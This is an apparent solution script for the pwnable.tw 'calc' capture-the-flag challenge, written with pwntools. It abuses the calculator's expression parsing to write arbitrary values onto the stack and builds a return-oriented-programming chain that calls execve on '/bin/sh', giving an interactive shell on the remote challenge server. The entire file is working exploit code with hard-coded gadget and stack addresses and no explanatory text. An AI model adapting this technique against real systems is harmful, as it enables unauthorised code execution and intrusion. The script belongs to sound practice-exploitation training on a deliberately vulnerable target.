#!/usr/bin/python
from pwn import *
from ctypes import *

host = 'chall.pwnable.tw'
port = 10100

def sign (address):
	return c_int (address).value

def offset (address):
	offs = sign (address)
	edx = sign (0xffffcc88)
	return (offs - 4 - edx) / 4

def write (address, value):
	payload = offset (address)

	if payload > 0:
        	payload = "+" + str (payload)
	else:
        	payload = str(payload)
	r.sendline(payload + "-" + str(value))

def exploit (r):
	#Gadgets
	bin_sh        = "/bin/sh\x00"
	pop_eax       = 0x0805c34b         # pop eax; ret
	pop_ebx       = 0x08048933         # pop ebx; pop edi; pop esi; ret
	pop_3         = 0x80528a7          # pop esi; pop edi; pop ebp; ret
	int_80        = 0x8070880          # int 0x80
	shell_address = 0xffffd2dc + len (bin_sh) - 4

	write (shell_address, u32 (bin_sh [4:8]))
	write (shell_address - 4, u32 (bin_sh [0:4]))
	write (0xffffd274, int_80)
	write (0xffffd264, pop_3)
	write (0xffffd254, pop_ebx)
	write (0xffffd250, 0xb)
	write (0xffffd24c, pop_eax)

	r.interactive()


if __name__ == '__main__':
        e = ELF ('./calc')

        if len (sys.argv) > 1:
                r = remote (host, port)
                exploit (r)
        else:
                r = process ('./calc')
                gdb.attach (r)
                exploit (r)
